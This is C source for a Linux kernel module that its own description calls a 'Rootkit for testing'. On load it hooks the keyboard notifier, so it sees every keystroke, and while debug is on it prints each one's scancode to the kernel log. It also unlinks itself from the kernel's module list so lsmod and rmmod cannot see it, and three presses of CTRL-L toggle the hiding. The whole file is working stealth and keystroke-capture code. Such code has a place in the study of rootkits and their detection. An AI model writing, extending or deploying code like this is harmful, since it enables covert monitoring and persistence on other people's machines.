#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mitchell Clay");
MODULE_DESCRIPTION("Rootkit for testing");

int kb_cb(struct notifier_block *nblock, unsigned long code, void *_param);
void rootkit_hide(void);
void rootkit_unhide(void);

static struct list_head *module_previous;
static int hidden = 0;
static int debug = 1;
static int ctrll_count = 0;

static struct notifier_block kb_blk = {
	.notifier_call = kb_cb,
};

// Hide from lsmod and rmmod. Keep pointer to previous module in the list so
// that we know where to jump back in to unhide
void rootkit_hide(void)
{
    if (hidden == 0) {
    	module_previous = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}

// Unhide from lsmod and rmmod. This is necessary to unload without rebooting
void rootkit_unhide(void)
{
    if (hidden == 1) {
        list_add(&THIS_MODULE->list, module_previous);
        hidden = 0;
    }
}

int kb_cb(struct notifier_block *nblock,
		  unsigned long code,
		  void *_param)
{
	struct keyboard_notifier_param *param = _param;

	if (debug) {
		printk(KERN_INFO "code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
			code, param->down, param->shift, param->value);
	}

	// Make sure not to double up on key-up events
	if (!(param->down))
		return NOTIFY_OK;

	// Check for CTRL-L x3
	if (param->value == 0x26 && param->shift == 4) {
		ctrll_count++;
		if (ctrll_count > 2) {
			if (debug) {
				printk(KERN_INFO "CTRL-L pressed 3 times!!!\n");
			}
			if (hidden) {
				if (debug) {
					printk(KERN_INFO "Unhiding CTRL-L rootkit\n");
				}
				rootkit_unhide();
			}
			else {
				if (debug) {
					printk(KERN_INFO "Hiding CTRL-L rootkit\n");
				}
				rootkit_hide();
			}
			ctrll_count = 0;
		}
	}
	else {
		// holding down ctrl causes repeats of 29, also had issues here with
		// scancodes in the 60000+ range getting picked up, filter them too
		if (param->value != 29 && param->value < 256) {
			ctrll_count = 0;
		}
	}

	return NOTIFY_OK;
}

// Anything here will be perfomed when module is loaded.
// To-do, options and flags (such as silent for no logging)
static int __init ctrll_rootkit_init(void)
{
    register_keyboard_notifier(&kb_blk);
	if (debug) {
 	   printk(KERN_INFO "ctrl-L rootkit loaded\n");
	}
    rootkit_hide();
    return 0;
}

// Clean up on module unload
static void __exit ctrll_rootkit_exit(void) {

	unregister_keyboard_notifier(&kb_blk);
	if (debug) {
   		printk(KERN_INFO "ctrl-L rootkit unloaded\n");
	}
}

module_init(ctrll_rootkit_init);
module_exit(ctrll_rootkit_exit);
